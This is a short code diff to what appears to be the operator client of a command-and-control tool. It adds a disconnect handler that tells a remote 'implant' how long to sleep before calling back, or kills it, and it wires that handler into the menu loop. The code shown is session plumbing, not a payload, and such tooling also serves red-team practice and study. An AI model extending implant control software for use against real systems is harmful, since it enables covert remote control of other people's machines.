@@ -14,9 +14,21 @@ import File
 import Dir
 
 
-
 def handleDisconnect(sock) -> bool:
     # Ask user if they want to kill connection or set timeout (if kill connection set timeout to 0)
+    callback = int(input("Number of seconds for implant to sleep before callback (0 to kill implant) > "))
+
+    # DisconnectCommand -> CommandDetails -> Command
+    disconnect_sleep = Common.DisconnectCommand(sleep=callback)
+    disconnect_details = Common.CommandDetails(disconnectcommand=disconnect_sleep)
+    disconnect_command = Common.Command(command=Common.Commands.disconnect, commanddetails=disconnect_details)
+
+    bytes_sent = sock.send(bytes(disconnect_command))
+
+    print(f"Sent {bytes_sent} bytes to implant")
+
+    sock.close()
+
     return True
 
 
@@ -59,10 +71,12 @@ def main():
     sock = establishConnection(host_ip, host_port)
 
     while (not exit):
-        printHelp()
+        print(printHelp())
         choice = int(input('> '))
         match choice:
             case Common.Commands.disconnect:
+                if (not handleDisconnect(sock)):
+                    print("Failed disconnect!")
                 exit = True
             case Common.Commands.getfile:
                 return
